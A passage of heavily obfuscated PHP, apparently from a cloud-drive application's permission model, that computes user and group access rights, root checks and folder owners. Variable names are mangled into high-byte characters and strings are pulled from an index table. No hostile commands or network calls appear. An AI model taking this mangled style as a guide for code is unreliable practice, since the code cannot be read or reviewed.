foreach ($”£²åÕ as $¸’ù’î) { $¦½•Œëì = !1; foreach ($¸’ù’î[$Õª²åÁÉ[2337]] as $Ô·ëö‰ï) { if ($Ô·ëö‰ï[$Õª²åÁÉ[1548]]) { if ($Ô·ëö‰ï[$Õª²åÁÉ[1548]] == $Î¼´ßŠŞ) { $¦½•Œëì = !0; break; } } if ($Ô·ëö‰ï[$Õª²åÁÉ[1450]]) { if ($this->groupContainUser($Ô·ëö‰ï[$Õª²åÁÉ[1450]], $Î¼´ßŠŞ)) { $¦½•Œëì = !0; break; } } } if ($¦½•Œëì) { $ğ²»‚ü[] = $¸’ù’î; } $‘ûª†Ù = $¸’ù’î[$Õª²åÁÉ[191]]; if (isset($˜à‡Œş[$‘ûª†Ù])) { $¸’ù’î[$Õª²åÁÉ[2337]][] = $˜à‡Œş[$‘ûª†Ù][0]; $˜à‡Œş[$‘ûª†Ù] = !1; } } $˜à‡Œş = array_filter(array_values($˜à‡Œş)); $ğ²»‚ü = array_merge($˜à‡Œş, $ğ²»‚ü); return $ğ²»‚ü; } public function setAllChildrenByUser($µ¤¨Ç®æ, $üÚ¢­ÆÜ, $î¹ÕàØ´) { $×§ƒ±ï™ =& $_SERVER[”øäÃÍª]; $µûâßÜÎ = $this->getAllChildrenByUser($µ¤¨Ç®æ, $üÚ¢­ÆÜ); if (!$î¹ÕàØ´ || !$µûâßÜÎ) { return !1; } foreach ($µûâßÜÎ as $ îÀ Û) { $ä°¹·˜‰ = array(); foreach ($ îÀ Û[$×§ƒ±ï™[2337]] as $òşÌñè²) { $ÃèÄú” = $òşÌñè²[$×§ƒ±ï™[564]]; $¶ÒŸÁ´• = $òşÌñè²[$×§ƒ±ï™[1548]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $–†œÕÔò = $òşÌñè²[$×§ƒ±ï™[1548]] ? $òşÌñè²[$×§ƒ±ï™[1548]] : $òşÌñè²[$×§ƒ±ï™[1450]]; if ($òşÌñè²[$×§ƒ±ï™[1548]] && $òşÌñè²[$×§ƒ±ï™[1548]] == $üÚ¢­ÆÜ) { continue; } $ä°¹·˜‰[] = array($×§ƒ±ï™[191] => $ îÀ Û[$×§ƒ±ï™[191]], $×§ƒ±ï™[188] => $¶ÒŸÁ´•, $×§ƒ±ï™[597] => intval($–†œÕÔò), $×§ƒ±ï™[1595] => isset($ÃèÄú”[$×§ƒ±ï™[487]]) ? intval($ÃèÄú”[$×§ƒ±ï™[487]]) : 0, $×§ƒ±ï™[2301] => isset($ÃèÄú”[$×§ƒ±ï™[2301]]) ? intval($ÃèÄú”[$×§ƒ±ï™[2301]]) : -1); } $ä°¹·˜‰[] = array($×§ƒ±ï™[191] => $ îÀ Û[$×§ƒ±ï™[191]], $×§ƒ±ï™[188] => SourceModel::TYPE_USER, $×§ƒ±ï™[597] => intval($üÚ¢­ÆÜ), $×§ƒ±ï™[1595] => intval($î¹ÕàØ´), $×§ƒ±ï™[2301] => -1); $this->where(array($×§ƒ±ï™[514] => $ îÀ Û[$×§ƒ±ï™[191]]))->delete(); $this->addAll($ä°¹·˜‰); } return !0; } public function get($Åæ€­—¡) { $ˆ˜í¢… = $this->getSourceList(array($Åæ€­—¡), !0); return $ˆ˜í¢…[0]; } public function getSourceList($Œ‹ÑÙ‘€, $‘«‚ŞùŞ = false, $òùºÊ•§ = false) { $ªƒúñ¸À =& $_SERVER[”øäÃÍª]; if (!$Œ‹ÑÙ‘€) { return array(); } $Üç„·ñ¥ = Model($ªƒúñ¸À[1488]); if (!$‘«‚ŞùŞ && count($Œ‹ÑÙ‘€) == 1) { $‘«‚ŞùŞ = array(); $‘«‚ŞùŞ[$Œ‹ÑÙ‘€[0]] = $Üç„·ñ¥->sourceInfo($Œ‹ÑÙ‘€[0]); } if (!$‘«‚ŞùŞ) { $˜¿­ç‹» = array($ªƒúñ¸À[514] => array($ªƒúñ¸À[515], $Œ‹ÑÙ‘€)); $‘«‚ŞùŞ = $Üç„·ñ¥->field($ªƒúñ¸À[2342])->where($˜¿­ç‹»)->select(); $‘«‚ŞùŞ = array_to_keyvalue($‘«‚ŞùŞ, $ªƒúñ¸À[191]); } $ÜÜ¥­ºê = $Œ‹ÑÙ‘€; foreach ($‘«‚ŞùŞ as $¤©Æõö– => $²ÜºÀ¦) { $„€ ’‹² = $Üç„·ñ¥->parentLevelArray($²ÜºÀ¦[$ªƒúñ¸À[612]]); $ÜÜ¥­ºê = array_merge($ÜÜ¥­ºê, array(intval($¤©Æõö–)), array_reverse($„€ ’‹²)); } $ÜÜ¥­ºê = array_values(array_unique($ÜÜ¥­ºê)); if (!$ÜÜ¥­ºê) { return array(); } $îÂî—Äá = $this->sourceAuthSelect($ÜÜ¥­ºê); $ÜÒÊ„˜¸ = array(); foreach ($ÜÜ¥­ºê as $œœŒ “„) { if (isset($îÂî—Äá[$œœŒ “„])) { $ÜÒÊ„˜¸[$œœŒ “„] = $îÂî—Äá[$œœŒ “„]; } } $€Şè±“Æ = $this->userIsRoot($òùºÊ•§); $è¢Ùºªï = AuthModel::authAll(); $èÅıŒó² = array($ªƒúñ¸À[511] => $è¢Ùºªï, $ªƒúñ¸À[2343] => array($ªƒúñ¸À[516] => 0, $ªƒúñ¸À[2146] => $è¢Ùºªï, $ªƒúñ¸À[517] => LNG($ªƒúñ¸À[2324]), $ªƒúñ¸À[2161] => $ªƒúñ¸À[2325])); $³µ ƒÕ— = array(); foreach ($‘«‚ŞùŞ as $œœŒ “„ => $Ä¶ãï­) { if ($€Şè±“Æ && $GLOBALS[$ªƒúñ¸À[6]][$ªƒúñ¸À[2159]]) { $³µ ƒÕ—[$œœŒ “„] = $èÅıŒó²; continue; } $³µ ƒÕ—[$œœŒ “„] = $this->makeSourceAuth($Ä¶ãï­, $ÜÒÊ„˜¸, $òùºÊ•§); } return $³µ ƒÕ—; } public function authDeepCheck($ğÍ¿é‡, $äß‰´ = false) { $‰‡¾¦«ô =& $_SERVER[”øäÃÍª]; $äß‰´ = $äß‰´ ? $äß‰´ : USER_ID; $†š“ÇÙ– = $this->makeAuthDeep($äß‰´); if (!in_array($ğÍ¿é‡, $†š“ÇÙ–[$‰‡¾¦«ô[2344]])) { return !1; } $¨˜†¯Ù = array(); foreach ($†š“ÇÙ–[$‰‡¾¦«ô[2345]] as $Ê¯–‹§ => $ÏÛ´ØìÔ) { if (!in_array($ğÍ¿é‡, $ÏÛ´ØìÔ)) { continue; } $¨˜†¯Ù[] = $Ê¯–‹§; } if (!$¨˜†¯Ù) { return !1; } $úÃ¥’ü = $¨˜†¯Ù ? $¨˜†¯Ù[0] : $ğÍ¿é‡; return array($‰‡¾¦«ô[511] => -1, $‰‡¾¦«ô[564] => array($‰‡¾¦«ô[516] => $‰‡¾¦«ô[1332], $‰‡¾¦«ô[2146] => $‰‡¾¦«ô[228], $‰‡¾¦«ô[517] => LNG($‰‡¾¦«ô[2346]), $‰‡¾¦«ô[2161] => $‰‡¾¦«ô[2347]), $‰‡¾¦«ô[2335] => LNG($‰‡¾¦«ô[2348]), $‰‡¾¦«ô[2349] => $this->sourceAuthInfo($úÃ¥’ü)); } protected function makeAuthDeep($¨…ı‚Ğ¤ = false) { $üÅñ´© =& $_SERVER[”øäÃÍª]; static $¡Úêë‰å = array(); $¨…ı‚Ğ¤ = $¨…ı‚Ğ¤ ? $¨…ı‚Ğ¤ : USER_ID; if (isset($¡Úêë‰å[$¨…ı‚Ğ¤])) { return $¡Úêë‰å[$¨…ı‚Ğ¤]; } $­Ä“ËÜ = Model($üÅñ´©[2350])->listData(); $Ó’ÀŠ”Ù = array(); foreach ($­Ä“ËÜ as $ãóÓ×²ü) { if ($ãóÓ×²ü[$üÅñ´©[510]] == 0 && $ãóÓ×²ü[$üÅñ´©[2160]] == $üÅñ´©[91]) { $Ó’ÀŠ”Ù[] = $ãóÓ×²ü[$üÅñ´©[487]]; } } $èÒËĞ›‚ = $this->userGroupParents($¨…ı‚Ğ¤); $é Ø»  = array($üÅñ´©[188] => SourceModel::TYPE_USER, $üÅñ´©[597] => $¨…ı‚Ğ¤); if ($èÒËĞ›‚) { $é Ø»  = array(array($üÅñ´©[188] => SourceModel::TYPE_USER, $üÅñ´©[597] => $¨…ı‚Ğ¤), array($üÅñ´©[188] => SourceModel::TYPE_GROUP, $üÅñ´©[597] => array($üÅñ´©[515], $èÒËĞ›‚)), $üÅñ´©[1122] => $üÅñ´©[2240]); } $Éóœò¦Å = $this->field($üÅñ´©[2351])->where($é Ø» )->select(); $óñƒ» = array(); $ùİîİª™ = array_to_keyvalue_group($Éóœò¦Å, $üÅñ´©[191]); foreach ($ùİîİª™ as $ÓÌ›ƒÚ => $Ğá‰€¡¾) { $¬¿ËìÈø = $this->authArrayCheck($Ğá‰€¡¾, $¨…ı‚Ğ¤); if ($¬¿ËìÈø[$üÅñ´©[511]] > 0) { $óñƒ»[] = $ÓÌ›ƒÚ . $üÅñ´©[12]; } } if ($èÒËĞ›‚) { $îÖÑ³±µ = Model($üÅñ´©[613]); foreach ($èÒËĞ›‚ as $ÏÏ´ëÍ¹) { $±ø®ÜÊ = $îÖÑ³±µ->getInfo($ÏÏ´ëÍ¹); if (!$±ø®ÜÊ || !is_array($±ø®ÜÊ[$üÅñ´©[90]])) { continue; } $óñƒ»[] = $±ø®ÜÊ[$üÅñ´©[90]][$üÅñ´©[191]]; } } $Œ†ä¾Ç = array(); $œËıãÖ = $èÒËĞ›‚; $ŞªÄàİ† = Model($üÅñ´©[1488]); $îÖÑ³±µ = Model($üÅñ´©[613]); $úñßÎØå = array(); $êÑŠõ• = array(); $ÌñäÎ¸ = array(); $„¼æ«˜ = array(); if ($óñƒ») { $İë÷Ïû¢ = $ŞªÄàİ†->where(array($üÅñ´©[191] => array($üÅñ´©[515], $óñƒ»)))->select(); foreach ($İë÷Ïû¢ as $â÷’êº) { if ($â÷’êº[$üÅñ´©[528]] == $üÅñ´©[91]) { continue; } $äµ •– = $ŞªÄàİ†->parentLevelArray($â÷’êº[$üÅñ´©[612]]); $Œ†ä¾Ç = array_merge($Œ†ä¾Ç, $äµ •–); $œËıãÖ[] = $â÷’êº[$üÅñ´©[597]]; $úñßÎØå[$â÷’êº[$üÅñ´©[191]]] = $äµ •–; $êÑŠõ•[$â÷’êº[$üÅñ´©[191]]] = $â÷’êº[$üÅñ´©[597]]; } } $œËıãÖ = array_values(array_unique($œËıãÖ)); $Õ£Ş¤ = $œËıãÖ; foreach ($Õ£Ş¤ as $ÏÏ´ëÍ¹) { $±ø®ÜÊ = $îÖÑ³±µ->getInfo($ÏÏ´ëÍ¹); $äµ •– = $ŞªÄàİ†->parentLevelArray($±ø®ÜÊ[$üÅñ´©[612]]); $œËıãÖ = array_merge($œËıãÖ, $äµ •–); } $œËıãÖ = array_values(array_unique($œËıãÖ)); foreach ($œËıãÖ as $ÏÏ´ëÍ¹) { $±ø®ÜÊ = $îÖÑ³±µ->getInfo($ÏÏ´ëÍ¹); $Œ†ä¾Ç[] = $±ø®ÜÊ[$üÅñ´©[90]][$üÅñ´©[191]]; $ÌñäÎ¸[$ÏÏ´ëÍ¹] = $±ø®ÜÊ[$üÅñ´©[90]][$üÅñ´©[191]]; $„¼æ«˜[$ÏÏ´ëÍ¹] = $ŞªÄàİ†->parentLevelArray($±ø®ÜÊ[$üÅñ´©[612]]); } foreach ($úñßÎØå as $Úë¥æŞó => $şæŠ¥™) { $µ¹É½á = $êÑŠõ•[$Úë¥æŞó]; if (!$µ¹É½á || !$ÌñäÎ¸[$µ¹É½á]) { continue; } $²Îàí‰¤ = array(); foreach ($„¼æ«˜[$µ¹É½á] as $ÏÏ´ëÍ¹) { $²Îàí‰¤[] = $ÌñäÎ¸[$ÏÏ´ëÍ¹]; } $úñßÎØå[$Úë¥æŞó] = array_merge($²Îàí‰¤, $şæŠ¥™); } $Œ†ä¾Ç = array_values(array_unique($Œ†ä¾Ç)); $ÀÁã‡Ã = array($üÅñ´©[2344] => $Œ†ä¾Ç, $üÅñ´©[2345] => $úñßÎØå); $¡Úêë‰å[$¨…ı‚Ğ¤] = $ÀÁã‡Ã; return $ÀÁã‡Ã; } private function makeSourceAuth($Å®Š¨×, $ÅæÀëêÓ, $Ú¤ ×å = false) { $’Æ¹ñ¬ =& $_SERVER[”øäÃÍª]; $ªöÔ¥£½ = $’Æ¹ñ¬[91]; $èÑ³˜åÒ = $Å®Š¨×[$’Æ¹ñ¬[597]]; $©²˜Ùùƒ = $Å®Š¨×[$’Æ¹ñ¬[188]] == SourceModel::TYPE_GROUP; $ÃÄÙó¢ú = $©²˜Ùùƒ ? $this->groupRootAuth($èÑ³˜åÒ, $Ú¤ ×å) : !1; if ($ÃÄÙó¢ú && Model($’Æ¹ñ¬[599])->authCheckAction($ÃÄÙó¢ú[$’Æ¹ñ¬[510]], $’Æ¹ñ¬[1520])) { return $this->groupAuthInfo($ÃÄÙó¢ú, $èÑ³˜åÒ); } $ïƒ¬ÜÇ¡ = Model($’Æ¹ñ¬[1488])->parentLevelArray($Å®Š¨×[$’Æ¹ñ¬[612]]); $ïƒ¬ÜÇ¡ = array_merge(array($Å®Š¨×[$’Æ¹ñ¬[191]]), array_reverse($ïƒ¬ÜÇ¡)); $èÈ–®ğº = !1; foreach ($ïƒ¬ÜÇ¡ as $ò€¦¸é) { if (!isset($ÅæÀëêÓ[$ò€¦¸é])) { continue; } $¿ıôéÄµ = $this->authMake($ÅæÀëêÓ[$ò€¦¸é], $Ú¤ ×å); if ($¿ıôéÄµ[$’Æ¹ñ¬[564]]) { $èÈ–®ğº = $¿ıôéÄµ; break; } } if (!$©²˜Ùùƒ) { return $èÈ–®ğº; } if (!$èÈ–®ğº && $ÃÄÙó¢ú) { $èÈ–®ğº = $this->groupAuthInfo($ÃÄÙó¢ú, $èÑ³˜åÒ); } if (!$èÈ–®ğº) { $Ø’Ô‘úÇ = Model($’Æ¹ñ¬[613])->getInfo($èÑ³˜åÒ); $•‰‡Æ•Ø = explode($’Æ¹ñ¬[50], trim($Ø’Ô‘úÇ[$’Æ¹ñ¬[612]], $’Æ¹ñ¬[50])); $•‰‡Æ•Ø = array_reverse($•‰‡Æ•Ø); foreach ($•‰‡Æ•Ø as $ş¾¾•ù¤) { if ($ş¾¾•ù¤ == $’Æ¹ñ¬[228] || $ş¾¾•ù¤ == $ªöÔ¥£½) { continue; } $û»³®üÌ = $this->groupRootAuth($ş¾¾•ù¤, $Ú¤ ×å); if (!$û»³®üÌ) { continue; } $èÈ–®ğº = $this->groupAuthInfo($û»³®üÌ, $ş¾¾•ù¤); break; } } if (!$èÈ–®ğº || $èÈ–®ğº[$’Æ¹ñ¬[511]] <= 0) { $‘•ôŸè = $this->authDeepCheck($Å®Š¨×[$’Æ¹ñ¬[191]], $Ú¤ ×å); if ($‘•ôŸè) { $èÈ–®ğº = $‘•ôŸè; } } return $èÈ–®ğº; } private function userIsRoot($Ú°Ëı“İ = false) { $´£¶ÁÈÕ =& $_SERVER[”øäÃÍª]; if (!$Ú°Ëı“İ && KodUser::isRoot()) { return !0; } $ä¡¦Êá = Model($´£¶ÁÈÕ[625])->getInfo($Ú°Ëı“İ); $×ïÖØ¼© = Model($´£¶ÁÈÕ[2328])->listData($ä¡¦Êá[$´£¶ÁÈÕ[2329]]); if ($×ïÖØ¼© && $×ïÖØ¼©[$´£¶ÁÈÕ[603]][$´£¶ÁÈÕ[2332]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ûËŞã„) { $Æ‘ûÜ²Ö =& $_SERVER[”øäÃÍª]; $˜ï»œİ­ = Model($Æ‘ûÜ²Ö[1488]); $ğÕü…ù§ = $˜ï»œİ­->sourceInfo($ûËŞã„); if (!$ğÕü…ù§) { return !1; } $˜ï»œİ­->groupPathDisplay($ğÕü…ù§); $òÓˆ‡¼õ = array($ğÕü…ù§); $òÓˆ‡¼õ = $˜ï»œİ­->_listAppendPath($òÓˆ‡¼õ, !1); $ğÕü…ù§ = $òÓˆ‡¼õ[0]; $›º÷Ãë = $ğÕü…ù§[$Æ‘ûÜ²Ö[610]]; if (isset($ğÕü…ù§[$Æ‘ûÜ²Ö[618]])) { $±£ï†ˆÀ = explode($Æ‘ûÜ²Ö[8], trim($ğÕü…ù§[$Æ‘ûÜ²Ö[610]], $Æ‘ûÜ²Ö[8])); array_shift($±£ï†ˆÀ); $›º÷Ãë = $ğÕü…ù§[$Æ‘ûÜ²Ö[616]] . $Æ‘ûÜ²Ö[2352] . implode($Æ‘ûÜ²Ö[8], $±£ï†ˆÀ); } return array($Æ‘ûÜ²Ö[32] => $ğÕü…ù§[$Æ‘ûÜ²Ö[32]], $Æ‘ûÜ²Ö[191] => $ğÕü…ù§[$Æ‘ûÜ²Ö[191]], $Æ‘ûÜ²Ö[87] => KodIO::make($ğÕü…ù§[$Æ‘ûÜ²Ö[191]]), $Æ‘ûÜ²Ö[610] => $›º÷Ãë); } private function groupAuthInfo($Ä±¯­ì„, $Ê»ãÜ²ò) { $ª÷Ñ»³ì =& $_SERVER[”øäÃÍª]; $âğºûÁ = Model($ª÷Ñ»³ì[613])->getInfo($Ê»ãÜ²ò); return array($ª÷Ñ»³ì[2353] => intval($Ä±¯­ì„[$ª÷Ñ»³ì[510]]), $ª÷Ñ»³ì[2343] => $Ä±¯­ì„, $ª÷Ñ»³ì[2354] => LNG($ª÷Ñ»³ì[2355]), $ª÷Ñ»³ì[2349] => array($ª÷Ñ»³ì[517] => $âğºûÁ[$ª÷Ñ»³ì[32]], $ª÷Ñ»³ì[87] => KodIO::make($âğºûÁ[$ª÷Ñ»³ì[90]][$ª÷Ñ»³ì[191]]), $ª÷Ñ»³ì[2356] => $âğºûÁ[$ª÷Ñ»³ì[617]])); } protected function groupRootAuth($Ì¶›‰, $ªúÏ¬ò = false) { $ÔØ±€¨¦ =& $_SERVER[”øäÃÍª]; $ªúÏ¬ò = $ªúÏ¬ò ? $ªúÏ¬ò : USER_ID; $©¦Êì€Ã = $ªúÏ¬ò . $ÔØ±€¨¦[2357] . $Ì¶›‰; static $½“å×®ò = array(); if (isset($½“å×®ò[$©¦Êì€Ã])) { return $½“å×®ò[$©¦Êì€Ã]; } $­ÁùóâÈ = Model($ÔØ±€¨¦[613])->getInfo($Ì¶›‰); $º‡ÄĞ£ = $this->userGroupList($ªúÏ¬ò); $ˆá«üäû = isset($º‡ÄĞ£[$Ì¶›‰]) ? $º‡ÄĞ£[$Ì¶›‰][$ÔØ±€¨¦[510]] : !1; if ($ˆá«üäû && Model($ÔØ±€¨¦[599])->authCheckAction($ˆá«üäû[$ÔØ±€¨¦[510]], $ÔØ±€¨¦[1520])) { $½“å×®ò[$©¦Êì€Ã] = $ˆá«üäû; return $ˆá«üäû; } $ÖÃ§¯®Ù = $this->sourceAuthSelect($­ÁùóâÈ[$ÔØ±€¨¦[90]][$ÔØ±€¨¦[191]]); $š²Õ¿œœ = $ÖÃ§¯®Ù ? $this->authMake($ÖÃ§¯®Ù, $ªúÏ¬ò) : !1; $¥å…êà = $š²Õ¿œœ ? $š²Õ¿œœ[$ÔØ±€¨¦[564]] : !1; $½“å×®ò[$©¦Êì€Ã] = $¥å…êà ? $¥å…êà : $ˆá«üäû; return $½“å×®ò[$©¦Êì€Ã]; } public function authOwnerApply($Œü‚şÙÊ) { $¬à—âÔ­ =& $_SERVER[”øäÃÍª]; if (empty($Œü‚şÙÊ[$¬à—âÔ­[510]]) || isset($Œü‚şÙÊ[$¬à—âÔ­[1539]]) && $Œü‚şÙÊ[$¬à—âÔ­[1539]]) { return $Œü‚şÙÊ; } if (AuthModel::authCheckRoot($Œü‚şÙÊ[$¬à—âÔ­[510]][$¬à—âÔ­[511]])) { return $Œü‚şÙÊ; } $ëĞ—îˆ = Model($¬à—âÔ­[1488])->parentLevelArray($Œü‚şÙÊ[$¬à—âÔ­[612]]); $ëĞ—îˆ = array_merge(array($Œü‚şÙÊ[$¬à—âÔ­[191]]), array_reverse($ëĞ—îˆ)); $ˆô—ß‹İ = $this->sourceAuthSelect($ëĞ—îˆ); $•¹Ÿ‹Ó = array(); $Ï´üØ¥µ = array(); foreach ($ˆô—ß‹İ as $–ÜêÂÛ => $ªêõ¦şà) { $¨é¥õÛñ = $this->authFolderOwnerUser($ªêõ¦şà); $•¹Ÿ‹Ó[$–ÜêÂÛ] = $¨é¥õÛñ; $Ï´üØ¥µ = array_merge($Ï´üØ¥µ, $¨é¥õÛñ[$¬à—âÔ­[692]]); if ($¨é¥õÛñ[$¬à—âÔ­[2358]]) { break; } } if (count($Ï´üØ¥µ) == 0) { $Ï´üØ¥µ = $this->authFolderOwnerGroup($Œü‚şÙÊ[$¬à—âÔ­[597]]); } $Ï´üØ¥µ = array_unique($Ï´üØ¥µ); if (AuthModel::authCheckRoot($Œü‚şÙÊ[$¬à—âÔ­[510]][$¬à—âÔ­[511]])) { $Ï´üØ¥µ[] = USER_ID; } $Œü‚şÙÊ[$¬à—âÔ­[510]][$¬à—âÔ­[2359]] = Model($¬à—âÔ­[605])->userListInfo($Ï´üØ¥µ); return $Œü‚şÙÊ; } private function authFolderOwnerGroup($©ÒƒÙ°) { $õº¿ÂÌà =& $_SERVER[”øäÃÍª]; $áù‹Ñ¼± = Model($õº¿ÂÌà[2232])->where(array($õº¿ÂÌà[1450] => $©ÒƒÙ°))->select(); $´ğÂŸ´Ö = array(); if (!$áù‹Ñ¼±) { return $´ğÂŸ´Ö; } foreach ($áù‹Ñ¼± as $îù•‘‹») { $—ÍÂ‡ğˆ = $this->authInfo($îù•‘‹»); if (AuthModel::authCheckRoot($—ÍÂ‡ğˆ[$õº¿ÂÌà[510]])) { $´ğÂŸ´Ö[] = $îù•‘‹»[$õº¿ÂÌà[1548]]; } } return $´ğÂŸ´Ö; } private function authFolderOwnerUser($»Ô¾ğ€ª) { $Ô¯Õ»Éà =& $_SERVER[”øäÃÍª]; $²¾ØË²Î = array(); $ä»š¡İï = !1; foreach ($»Ô¾ğ€ª as $§ëşêô) { $·ÂÚ€ = $this->authInfo($§ëşêô); if ($§ëşêô[$Ô¯Õ»Éà[597]] == $Ô¯Õ»Éà[228]) { $ä»š¡İï = !0; } if ($§ëşêô[$Ô¯Õ»Éà[188]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($·ÂÚ€[$Ô¯Õ»Éà[510]])) { $²¾ØË²Î[] = $§ëşêô[$Ô¯Õ»Éà[597]]; } } } return array($Ô¯Õ»Éà[692] => $²¾ØË²Î, $Ô¯Õ»Éà[2358] => $ä»š¡İï); } public function authMake($…ÏˆÀ, $™÷¡Ôó€ = false) { $ğòĞø×‡ =& $_SERVER[”øäÃÍª]; $îùüÒÕ = $this->authArrayCheck($…ÏˆÀ, $™÷¡Ôó€); if ($îùüÒÕ[$ğòĞø×‡[2339]]) { $îùüÒÕ[$ğòĞø×‡[2339]] = $this->sourceAuthInfo($îùüÒÕ[$ğòĞø×‡[2339]]); } return $îùüÒÕ; } public function authArrayCheck($Œ¢è—‡‹, $¦ÓÛÈéà = false) { $»ÊÁû¥² =& $_SERVER[”øäÃÍª]; if (!$Œ¢è—‡‹) { return array($»ÊÁû¥²[511] => 0, $»ÊÁû¥²[564] => !1, $»ÊÁû¥²[2354] => $»ÊÁû¥²[12]); } $¦ÓÛÈéà = $¦ÓÛÈéà ? $¦ÓÛÈéà : USER_ID; $—À“å§³ = 0; $ãàƒë…Ğ = 0; $¦«ßÈ­á = 0; $€Ÿ××¡» = 0; $Ò¹–¨şİ = 0; $¿“¦à¾µ = 0; $É“‡¬™ı = 0; $Á‰™š…Ï = 0; $¥„íì‡¸ = 1000; $Ø®øòô¾ = 0; $„Ğ˜Œæ¤ = 0; $¬›¢İ” = 0; $†ß“¿’Ä = 0; $Ùì’ò£ = 0; foreach ($Œ¢è—‡‹ as $¿”ş£†) { $ğşĞŠ× = $this->authInfo($¿”ş£†); if (!$ğşĞŠ×) { continue; } $·œá¢­š = $¿”ş£†[$»ÊÁû¥²[597]]; $…´õ˜œò = $¿”ş£†[$»ÊÁû¥²[191]]; $å¯Á®µ‘ = intval($ğşĞŠ×[$»ÊÁû¥²[510]]); if ($¿”ş£†[$»ÊÁû¥²[188]] == SourceModel::TYPE_USER && $·œá¢­š == $¦ÓÛÈéà) { $—À“å§³ = !0; $¦«ßÈ­á = $ğşĞŠ×; $ãàƒë…Ğ = $å¯Á®µ‘; $€Ÿ××¡» = $…´õ˜œò; } else { if ($¿”ş£†[$»ÊÁû¥²[188]] == SourceModel::TYPE_GROUP && $this->groupContainUser($·œá¢­š, $¦ÓÛÈéà)) { $Ò¹–¨şİ = !0; $õ»¥£Ïï = $this->groupStepToUserGroup($·œá¢­š, $¦ÓÛÈéà); if ($õ»¥£Ïï < $¥„íì‡¸) { $¥„íì‡¸ = $õ»¥£Ïï; $¿“¦à¾µ = $å¯Á®µ‘; $É“‡¬™ı = $ğşĞŠ×; $Ø®øòô¾ = $·œá¢­š; $Á‰™š…Ï = $…´õ˜œò; } if ($õ»¥£Ïï == $¥„íì‡¸ && $å¯Á®µ‘ >= $¿“¦à¾µ) { $¿“¦à¾µ = $å¯Á®µ‘; $É“‡¬™ı = $ğşĞŠ×; $Ø®øòô¾ = $·œá¢­š; $Á‰™š…Ï = $…´õ˜œò; } } else { if (!$·œá¢­š || $·œá¢­š == $»ÊÁû¥²[228]) { $„Ğ˜Œæ¤ = !0; $†ß“¿’Ä = $ğşĞŠ×; $¬›¢İ” = $å¯Á®µ‘; $Ùì’ò£ = $…´õ˜œò; } } } } if ($—À“å§³) { $ôÒ£ÁÆ = $ãàƒë…Ğ; $ğşĞŠ× = $¦«ßÈ­á; $öÊõ£ = $€Ÿ××¡»; $¬èŠ‡Ê = LNG($»ÊÁû¥²[2360]); } else { if ($Ò¹–¨şİ) { $ôÒ£ÁÆ = $¿“¦à¾µ; $ğşĞŠ× = $É“‡¬™ı; $öÊõ£ = $Á‰™š…Ï; $©îøÁ¿İ = Model($»ÊÁû¥²[613])->getInfo($Ø®øòô¾); $¬èŠ‡Ê = $»ÊÁû¥²[173] . $©îøÁ¿İ[$»ÊÁû¥²[617]] . $»ÊÁû¥²[2361] . LNG($»ÊÁû¥²[2362]); } else { if ($„Ğ˜Œæ¤) { $ôÒ£ÁÆ = $¬›¢İ”; $ğşĞŠ× = $†ß“¿’Ä; $öÊõ£ = $Ùì’ò£; $¬èŠ‡Ê = LNG($»ÊÁû¥²[2341]); } else { $ôÒ£ÁÆ = 0; $ğşĞŠ× = !1; $¬èŠ‡Ê = $»ÊÁû¥²[12]; $öÊõ£ = $»ÊÁû¥²[12]; } } } $ÇÛ‡ŸŠŸ = array($»ÊÁû¥²[2353] => intval($ôÒ£ÁÆ), $»ÊÁû¥²[2343] => $ğşĞŠ×, $»ÊÁû¥²[2354] => $¬èŠ‡Ê, $»ÊÁû¥²[2349] => $öÊõ£); return $ÇÛ‡ŸŠŸ; } private function groupContainUser($éÜ·ğè, $¶õùÊ±ë = false) { return in_array($éÜ·ğè, $this->userGroupParents($¶õùÊ±ë)); } private function groupStepToUserGroup($ÅÄŸ¿«‚, $ŸÅ¬ÆÚú = false) { $¤Õ¨›ÖÛ =& $_SERVER[”øäÃÍª]; $Õœ««ß = $this->userGroupList($ŸÅ¬ÆÚú); $¥î©íğ = 1000; $µŞË’ú¤ = $GLOBALS[$¤Õ¨›ÖÛ[6]][$¤Õ¨›ÖÛ[92]][$¤Õ¨›ÖÛ[2245]] == 1; $ßïû»úå = $µŞË’ú¤ ? 3 : 2; foreach ($Õœ««ß as $À³ØŠË) { if ($À³ØŠË[$¤Õ¨›ÖÛ[1450]] == $ÅÄŸ¿«‚) { return 0; } $Í—Õ¾Ó = explode($¤Õ¨›ÖÛ[50], trim($À³ØŠË[$¤Õ¨›ÖÛ[612]], $¤Õ¨›ÖÛ[50])); if ($Í—Õ¾Ó[0] == $¤Õ¨›ÖÛ[228] && count($Í—Õ¾Ó) > $ßïû»úå) { $ÅÛ­”ˆ = array_reverse(array_slice($Í—Õ¾Ó, $ßïû»úå)); $æ´¡ˆó¤ = array_search($ÅÄŸ¿«‚, $ÅÛ­”ˆ); if ($æ´¡ˆó¤ !== !1 && $æ´¡ˆó¤ + 1 <= $¥î©íğ) { $¥î©íğ = $æ´¡ˆó¤ + 1; } } } return $¥î©íğ; } private function userGroupList($‹íš™ş = false, $ù½ö‡Í‹ = false) { $äÖ§ş³” =& $_SERVER[”øäÃÍª]; static $¤éÓúÈÕ = array(); if (isset($¤éÓúÈÕ[$‹íš™ş])) { return $¤éÓúÈÕ[$‹íš™ş]; } if (!$ù½ö‡Í‹) { $ù½ö‡Í‹ = Model($äÖ§ş³”[625])->getInfo($‹íš™ş); } $¤éÓúÈÕ[$‹íš™ş] = array_to_keyvalue($ù½ö‡Í‹[$äÖ§ş³”[1449]], $äÖ§ş³”[1450]); return $¤éÓúÈÕ[$‹íš™ş]; } public function userGroupParents($ø…±µÖË) { $€ŸËş• =& $_SERVER[”øäÃÍª]; static $İÆ±ÛÄ = array(); $ø…±µÖË = $ø…±µÖË ? $ø…±µÖË : USER_ID; if (isset($İÆ±ÛÄ[$ø…±µÖË])) { return $İÆ±ÛÄ[$ø…±µÖË]; } $ïß¿»Îß = $this->userGroupList($ø…±µÖË); $íêìÄö = array(); $Õµ‚ç€© = $GLOBALS[$€ŸËş•[6]][$€ŸËş•[92]][$€ŸËş•[2245]] == 1; $‘Æ®áù = $Õµ‚ç€© ? 3 : 2; foreach ($ïß¿»Îß as $ó¶ÔÊÎ) { $µÑ¾Ï×Š = array($ó¶ÔÊÎ[$€ŸËş•[1450]]); $ÈŞõĞ– = explode($€ŸËş•[50], trim($ó¶ÔÊÎ[$€ŸËş•[612]], $€ŸËş•[50])); if ($ÈŞõĞ–[0] == 